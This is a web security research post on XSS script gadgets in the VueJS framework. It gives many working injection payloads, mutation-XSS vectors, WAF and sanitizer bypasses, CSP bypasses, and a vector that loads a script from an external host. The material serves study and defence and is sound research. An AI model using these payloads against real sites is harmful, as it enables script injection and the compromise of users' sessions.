# Evading defences using VueJS script gadgets

Source: https://portswigger.net/research/evading-defences-using-vuejs-script-gadgets
Fetched: 2026-06-28T09:17:24.736766+00:00

Evading defences using VueJS script gadgets

Gareth Heyes

Researcher

@garethheyes

Published: Monday, 12 October 2020 at 13:00 UTC

Updated: Wednesday, 7 September 2022 at 09:05 UTC

Introduction

We've found that the popular JavaScript framework VueJS offers features with serious implications for website security. If you encounter a web application that uses Vue, this post will help you identify Vue-specific XSS vectors created from script gadgets, which you can use to exploit the target.

A script gadget is any additional functionality created by the framework that can cause JavaScript execution. These can be JavaScript or HTML-based. Script gadgets are often useful for bypassing defences like WAFs and CSP. From a developer perspective, it's also useful to know all the script gadgets a framework or library creates; this knowledge can help prevent XSS vulnerabilities when allowing user input in your own web applications. In this post, we'll cover a wide range of techniques from expression-based vectors to mutation XSS (mXSS).

Warning

There's a lot of information here! If you're interested in learning about hacking frameworks, you'll probably want to read the whole thing. But if you've encountered a particular scenario and simply need a vector to solve it, you can jump straight to the freshly updated VueJS section in our XSS Cheat Sheet.

In this post, we'll cover:

Directives

Shortening payloads

Events

Mutation

Adapting payloads for V3

Teleport

Use cases

Where it all started

While tweeting about various VueJS hacks, me, Lewis Ardern, and PwnFunction decided to create a blog post to cover them in more detail. We had great fun collaborating and coming up with some interesting vectors. It all started with trying to reduce the following VueJS XSS vector:

{{toString().constructor.constructor('alert(1)')()}}

To work out how to reduce it, we needed to see how our vector was being transformed. We looked at the VueJS source and searched for Function constructor calls. There were some instances where the Function constructor was called, but the created function was not. We skipped these instances because we were sure that this wasn't where our code was being transformed. On line 11648 we eventually found a Function constructor that was calling the generated function:

return new Function(code)

We added a breakpoint at that line and refreshed the page. We then inspected the contents of the code variable and, sure enough, we could see our vector. The code was within a with statement and followed by a return statement. Therefore, the scope of the executed code was within the object specified in the with statement. Basically, this meant there was no global alert() function, but within the with scope, there were VueJS functions, such as _c, _v, and _s.

If we use these functions, we can reduce the size of our expression. The constructor of this function would be the Function constructor, which allows us to execute code. This means we can reduce the vector to:

{{_c.constructor('alert(1)')()}}

Debugging VueJS

Before we continue, it’s probably a good idea to quickly go over the debugging tools that we used.

Vue Devtools: The official browser extension, which can be used for debugging applications built with VueJS.

Vue-template-compiler: Compiles templates to render functions, which helps us see how Vue represents templates internally. There’s a handy online version of the tool called template-explorer.

From time to time, we also overwrote the VueJS prototype to add functionality like logging so that we could see what was happening internally.

VueJS version 2

Directives

Just like other frameworks, there are directives in VueJS that make our lives easier.Pretty much every VueJS directive can be leveraged as a gadget. Let’s look at an example.

v-show Directive

<p v-show="_c.constructor`alert(1)`()">

This is a relatively straightforward piece of code. There’s a directive called v-show, which is used to show or hide an element from the DOM based on a logical condition. In this case, the condition is the vector.

This very same vector can be applied to other directives, including v-for, v-model, v-on etc.

v-on Directive

<x v-on:click='_b.constructor`alert(1)`()'>click</x>

v-bind Directive

<x v-bind:a='_b.constructor`alert(1)`()'>

The diverse nature of these gadgets can help you create flexible vectors that can be used to bypass WAFs very easily.

Minimizing vectors

Minimizing vectors - also known as "code golfing" - means finding ways to achieve the same result with as few characters or bytes as possible. We initially assumed that the shortest possible vector would be a template expression, meaning that we'd have to use 4 bytes just to add the required curly braces {{ }}. However, this assumption turned out to be wrong.

We spend a good amount of time debugging, looking at the source, and reading documentation. We couldn’t find any ways to shorten the vector via templates, so we began looking at the tags.

We started with 35 bytes and eventually worked up the ladder. But along the way we found some pretty interesting vectors using VueJS parser quirks:

<x @[_b.constructor`alert(1)`()]> (35 bytes)

<x :[_b.constructor`alert(1)`()]>  (33 bytes)

<p v-=_c.constructor`alert(1)`()> (33 bytes)

<x #[_c.constructor`alert(1)`()]> (33 bytes)

<p :=_c.constructor`alert(1)`()> (32 bytes)

But the shorter ones were still the template vectors:

{{_c.constructor('alert(1)')()}}  (32 bytes)

{{_b.constructor`alert(1)`()}}    (30 bytes)

After trying countless ways to code golf, just so we could get it under 30 bytes, we eventually came across Dynamic Components in the Vue API.

Dynamic components are essentially components that can be changed to a different component at a later point in time. This is achieved by using the is attribute on a tag. Consider the following example:

<x v-bind:is="'script'" src="//14.rs" />

This can be shortened to:

<x is=script src=//⑭.₨>

That's now only 23 characters and 27 bytes! This is the shortest vector we could come up with for VueJS v2 during the entire research.

Events

Just like AngularJS, VueJS defines a special object called $event, which references the event object in the browser. Using this $event object, you can access the browser window object, allowing you to call anything you like:

<img src @error="e=$event.path;e[e.length-1].alert(1)">

<img src @error="e=$event.path.pop().alert(1)">

We identified that @error would evaluate an expression because VueJS offers shorthand syntax, which enables you to prefix handlers for events like error or click with @ instead of using the v-on directive. The documentation also reveals that you can use the $event variable to access the original DOM event.

These vectors work thanks to a special path property that Chrome defines when the event is executed. This property contains an array of objects that triggered the event. Crucially for us, the window object is always the last element in this array. The composedPath() function generates a similar array in other browsers, which allows us to construct a cross-browser vector as follows:

<img src @error="e=$event.composedPath().pop().alert(1)">

We then started to look how we could reduce event-based vectors and noticed some interesting behaviour in VueJS. The rewritten code that VueJS generates uses this and doesn't use strict mode. As a result, when using a function, this refers to the window object, allowing for an even shorter vector:

<img src @error=this.alert(1)>

This concept can also be demonstrated without using an event:

{{-function(){this.alert(1)}()}}

As the injected function inherits the global object window, when inside a function, this points to the window object.

We managed to reduce our event-based vector even further by using an SVG tag and a load event:

<svg @load=this.alert(1)>

At first, we thought that this was the smallest it could possibly be. But then we had a thought - if VueJS is parsing these special events, maybe it allows things that normal HTML doesn't. Of course it does:

<svg@load=this.alert(1)>

Silent sinks

By default, when frameworks like AngularJS (version 1) and VueJS render the page, they do not perform ahead-of-time (AoT) completion. This quirk means that, if you are able to inject inside a template that uses the framework, you might be able to sneak in your own arbitrary payload that will be executed.

This can sometimes cause issues when an application has partially been refactored to use a new framework but still contains legacy code that relies on additional third-party libraries. A good example of this is VueJS and JQuery. The JQuery library exposes various methods, such as text(). On its own, this is relatively safe from XSS because it HTML-encodes its output. However, when you combine this with a framework that uses Mustache-style templating syntax, such as {{ }}, with a method that only performs text operations, such as $(‘#message’).text(userInput), this can lead to a "silent" sink. This is an interesting attack vector because you are introducing a new vulnerability into what is generally considered a safe method. For example, in this fiddle, notice that only the second payload is executed:

$('#message').text("'><script>alert(1)<\/script>'");

$('#message1').text("{{_c.constructor('alert(2)')()}}")

Mutation XSS

We then started to look at mutation XSS (mXSS) vectors and how we could use VueJS to cause them. Traditionally, mXSS vectors require modification in the DOM in order to mutate; reflected input won't normally mutate because the DOM isn't being modified after being injected. However, in the case of VueJS, expressions and HTML are parsed and subsequently altered, which means that DOM modification does occur. As a result, reflected input that is filtered by an HTML filter can turn into mXSS!

The first mutation we found was caused by the way VueJS parses attributes. If you use quotes within the attribute name, VueJS gets confused, decodes the attribute value, and then removes the invalid attribute name. This causes mXSS and renders the iframe:

Input:

<x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;">

Output:

"="<iframe onload="alert(1)">"></iframe>

This worked when referencing VueJS from a relative URL, but when using the unpkg.com domain to serve the JS, this returned a 403 because the server uses Cloudflare, which blocked the request because of the vector in the referrer. We were able to bypass this with a bit of trickery:

<a href="https://portswigger-labs.net/xss/vuejs.php?x=%3Cx%20title%22=%22%26lt;iframe%26Tab;onload%26Tab;=setTimeout(top.name)%26gt;%22%3E" target=alert(1337)>test</a>

We used htmlentities to fool the Cloudflare WAF into allowing the onload event and then used a setTimeout(), which evaluates a string and passes the window name to it. Later, we worked out that you could simplify the bypass as follows:

<x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;">

We also fuzzed for more mutations and found that the following examples also mutated:

<x < x="&lt;iframe onload=alert(0)&gt;">

<x = x="&lt;iframe onload=alert(0)&gt;">

<x ' x="&lt;iframe onload=alert(0)&gt;">

Further experimentation revealed other mXSS behaviour. Normally, a tag within a template tag won't be rendered. However, it turns out that VueJS removes the <template> tag while leaving the markup inside. The remaining markup will then be rendered:

Input:

<template><iframe></iframe></template>

Enter this in the dev tools console:

document.body.innerHTML+=''

Output:

<iframe></iframe>

As VueJS was removing the <template> tag, we wondered if we could use this to cause a mutation. We placed the <template> tag within another and were surprised to see this mutation:

Input:

<xmp><<template></template>/xmp><<template></template>iframe></xmp>

Enter this in the dev tools console:

document.body.innerHTML+=''

Output:

<xmp></xmp><iframe></xmp>

We also discovered that <noscript> will mutate with DOM manipulation as well:

<noscript>&lt;/noscript&gt;&lt;iframe&gt;</noscript>

Enter this in the dev tools console:

document.body.innerHTML+=''

The same even applies to XMP:

Input:

<xmp>&lt;/xmp&gt;&lt;iframe&gt;</xmp>

Enter this in the dev tools console:

document.body.innerHTML+=''

We eventually found that these mutations were also possible with <noframes>, <noembed>, and <iframe> elements. This was interesting, but what we really needed was a way to cause mutation to happen via VueJS without any manual DOM manipulation. On our search for mutation, we realised that VueJS will mutate HTML. We came up with a simple test to prove this. Normally, if you place a tag within another tag, only the first tag will be rendered because no closing > is found for the second one. On the other hand, VueJS will actually mutate and remove the first tag for you:

Input:

<xyz<img/src onerror=alert(1)>>

Output:

<img src="" onerror="alert(1)">&gt;

Next, we needed to create a vector that would bypass an HTML filter before becoming dangerous after a mutation. After many hours of trying, we discovered that if you use multiple SVG tags, you can cause the DOM to be modified by VueJS. This caused a mutation, turning reflected XSS into mXSS:

Input:

<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=alert(1)&gt;</noscript></b></svg>

Output:

<p><svg><svg></svg></svg><b><noscript></noscript><iframe onload="alert(1)"></iframe></b></p>

Finally, here's another PoC that mutates and bypasses the Cloudflare WAF:

Input:

<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;</noscript></b></svg>

Output:

<svg><svg></svg></svg><b><noscript></noscript><iframe onload="setTimeout(/alert(1)/.source)"></iframe></b>

Mutation and CSP

We noticed the mutations didn't work when CSP was enabled. This was because they contained normal DOM event handlers, which they were blocked by the CSP. But then we had a thought - what if we injected mutated HTML with VueJS special events? This would be rendered by VueJS, executing our code and the custom event handlers, which would bypass the CSP. We weren't sure if the mutated DOM would execute these handlers but, to our delight, it did!

First, we injected the mutation vector with an image and used the VueJS @error event handler. When the DOM is mutated, the image is rendered along with the @error handler. We then used the special $event object to get a reference to window and execute our alert():

Input:

<svg><svg><b><noscript>&lt;/noscript&gt;&lt;img/src/&Tab;@error=$event.path.pop().alert(1)&gt;</noscript></b></svg>

Output:

<p><svg><svg></svg></svg><b><noscript></noscript><img src=""></b></p>

The mutated DOM doesn't show the @error event, but it still executes. You can see this in the following example:

mXSS with CSP enabled

The mutation vectors from this section will also work in version 3.

Proof of concept

Adapting payloads for VueJS 3

While we were conducting this research, VueJS 3 was released and broke many of the vectors we'd discovered. We decided to have a quick look and see if we could make them work again. A lot of code has changed in version 3, for example, the Function constructor has moved to line 13035 and the shortened versions of the VueJS functions, such as _b, have been removed .

Adding the breakpoint on 13055, we inspected the contents of the code variable. It seems VueJS has similar functions to version 2; they're just more verbose with their function names. We simply needed to replace the short form of the function with the longer form:

{{_openBlock.constructor('alert(1)')()}}

There are a few different functions available within the scope of the executing expression:

{{_createBlock.constructor('alert(1)')()}}

{{_toDisplayString.constructor('alert(1)')()}}

{{_createVNode.constructor('alert(1)')()}}

Most of the vectors in this post can be made to work on v3 simply by using the more verbose function:

<p v-show="_createBlock.constructor`alert(1)`()">

There are some instances where the payloads fail to execute, for example, when using the following vector:

<x @[_openBlock.constructor`alert(1)`()]>

This fails because the expression is converted to lowercase by VueJS, which results in it trying to call the non-existent _objectblockfunction... To to get around this problem, we used the _capitalize function within the scope:

<x @[_capitalize.constructor`alert(1)`()]>

Events also expose different functions. In addition to the $event object that we discussed earlier, there is also _withCtx and _resolveComponent. The later is a little too long, but _withCtx is nice and short:

<x @click=_withCtx.constructor`alert(1)`()>click</x>

Using $event is also a handy shortcut:

<x @click=$event.view.alert(1)>click</x>

Code golfing in V3

Our vectors now work in v3, but they're still quite long. We looked for shorter function names and noticed there is a variable called _Vue, which is in the current scope. We passed this variable to the Function constructor and used console.log() to inspect the contents of the object:

{{_createBlock.constructor('x','console.log(x)')(_Vue)}}

This appeared to just be a reference to the Vue global, as expected, but the object has a function called h. This is a nice, short function name, which we can use to reduce the vector to:

{{_Vue.h.constructor`alert(1)`()}}

When trying to find ways of reducing this further, we started with a base vector and injected a Function constructor call. But this time, instead of just calling alert(), we passed the object we wanted to inspect to our function and used console.log() to inspect the contents of the object/proxy. A proxy is a special JavaScript object that allows us to intercept operations on the object being proxied. Such as get/set operations or function calls. Vue uses proxies so they can provide functions/properties to expressions that they can use within the current scope. The expression we used is below:

{{_Vue.h.constructor('x','console.log(x)')(this)}}

This will output an object in the console window. If you inspect the [[Target]] property of the proxy, you will be able to see the potential functions that you can use. Using this approach, we identified the functions $nextTick, $watch, $forceUpdate, and $emit. Using the shortest of these, we were able to produce the following vector:

{{$emit.constructor`alert(1)`()}}

You've already seen our shortest vector for VueJS v2:

<x is=script src=//14.rs>

This doesn’t work because VueJS v3 tries to resolve a component called x which doesn’t exist because it’s native. The following code is a part of the render() function.

return function render(_ctx, _cache) {

with (_ctx) {

...

const _component_x = _resolveComponent("x")

...

}

}

However, there’s a special <component> tag, which is used hand-in-hand with is to create dynamic components. So all we need to do is to change x to component.

<component is=script src=//14.rs>

For the above vector, the render() function looks like this:

return function render(_ctx, _cache) {

with (_ctx) {

...

return (_openBlock(),

_createBlock(_resolveDynamicComponent("script"),

{ src: "//⑭.₨" }))

}

}

As a result, the shortest vector for VueJS v3 is 31 bytes.

<component is=script src=//⑭.₨>

In version 3, it's possible to use DOM properties as attributes of the <component> tag. This means you can use the DOM property text, which will be added to the <script> tag as a text node that will then be added to the DOM.

<component is=script text=alert(1)>

Teleport

We came across a really interesting new tag in VueJS 3 called <teleport>. This tag allows you to transfer the contents of the <teleport> tag to any other tag by using the to attribute, which accepts a CSS selector:

<teleport to="#x"><b>test</b></teleport>

The contents of the tag are transferred even for text nodes. This means we can HTML-encode the text node and it will be decoded before it's transferred. This works for

<script>

and

<style>

tags, although in our tests we found that you need a existing, blank

<script>

element:

<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>

Proof of concept

In this example, the current style is blue, but we inject a <teleport> tag to change the style of the inline stylesheet. The text then changes to red:

<teleport to="style">

/* Can be Entity Encoded */

h1 {

color: red;

}

</teleport>

</div>

<h1>aaaa</h1>

<style>

h1 {

color: blue;

}

</style>

Proof of concept

You can combine HTML encoding with unicode escapes in JavaScript to produce some nice vectors that might bypass a few WAF's:

<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>

Proof of concept

Reverse teleport

We also discovered something that we've decided to call a "reverse teleport". We've already discussed that VueJS has a <teleport> tag, but if you include a CSS selector within the template expression, you can target any other HTML element and execute the contents of that element as an expression. This works even if the target tag is outside the application boundary!

We were all quite shocked when we realised that VueJS runs querySelector on the entire contents of the expression, provided it begins with a #. The following snippet demonstrates an expression with a CSS query that targets the <div> with a class of haha. The second expression is executed even though it's outside of the application boundary.

<div id="app">#x,.haha</div><div class=haha>{{_Vue.h.constructor`alert(1)`()}}</div>

<!-- Notice the div above is outside the application div -->

<script src="vue3.js"></script>

<script nonce="sometoken">

const app = Vue.createApp({

data() {

return {

input: '# hello'

}

}

})

app.mount('#app')

</script>

Use cases

In this section, we'll take a closer look at where these script gadgets can come in handy.

WAF

Let’s start with Web Application Firewalls. As we've already seen, there's a substantial number of potential gadgets to discover. Since Vue is also happy about decoding HTML entities, there's a high probability that you'll be able to bypass common WAFs, such as Cloudflare.

Sanitizers

Sanitizers, such as DOMPurify, have a very good set of whitelists for tags and attributes to help block anything that's not considered normal. However, as they all allow template syntax, they do not provide robust protection against XSS attacks when used in conjunction with front-end frameworks like VueJS.

CSP

Vue works by performing a lexical analysis of the content and parsing it into an abstract syntax tree (AST). The code is passed into a render function as a string, where it is executed due to the eval-like functionality of the Function constructor. This means that the CSP must be defined in a way that allows VueJS and the app to still work properly. If it contains unsafe-eval, you can use Vue to bypass the CSP easily. Note that for strict-dynamic or nonce bypasses, unsafe-eval is a requirement.

Unsafe-eval + nonce :

// v2

{{_c.constructor`alert(document.currentScript.nonce)`()}}

// v3

{{_Vue.h.constructor`alert(document.currentScript.nonce)`()}}

The majority of the vectors in this post work with CSP. The only exceptions are dynamic components and teleport-based vectors. This is because they attempt to append a script node to the document, which CSP will block (depending on the policy).

Conclusion

We hope you've enjoyed our post as much as we've enjoyed writing it and coming up with interesting gadgets. Some words of advice for the developers and hackers viewing this post:

When creating a JavaScript framework, perhaps consider the attack surface you are introducing to the application with the features you are adding. Think carefully about how they might be used or abused.

For hackers, when you take a look at a new framework, dig deep into its features. See how they are generally used and how they might be abused or misused. We recommended looking into the underlying source to understand exactly what's going on under the hood.

All the vectors discussed in the post have been added to our XSS cheat sheet in the VueJS section.

If you liked this post, let us know! We are interested in doing more research into VueJS and other client and server-side frameworks.

About Lewis

Lewis Ardern is an Associate Principal Consultant at Synopsys. His primary areas of expertise are in web security and security engineering. Lewis enjoys creating and delivering security training to various types of organizations and institutes in topics such as web and JavaScript security. He is also the founder of the Leeds Ethical Hacking Society and has helped develop projects such as bXSS and SecGen.

About PwnFunction

PwnFunction is an Independent AppSec Consultant by day and a Researcher by night. He’s known for his YouTube Channel. Pwn’s interests revolve mostly around Application Security, but he is also interested in Low Level jazz such as Binary and Browser exploitation. Other than computers, he loves Math, Science and Philosophy.

XSS

JavaScript

mXSS

VueJS

Back to all articles

Related Research

Cookie Chaos: How to bypass __Host and __Secure cookie prefixes

03 September 2025

Cookie Chaos: How to bypass __Host and __Secure cookie prefixes

Stealing HttpOnly cookies with the cookie sandwich technique

22 January 2025

Stealing HttpOnly cookies with the cookie sandwich technique

Bypassing WAFs with the phantom $Version cookie

04 December 2024

Bypassing WAFs with the phantom $Version cookie

Concealing payloads in URL credentials

23 October 2024

Concealing payloads in URL credentials
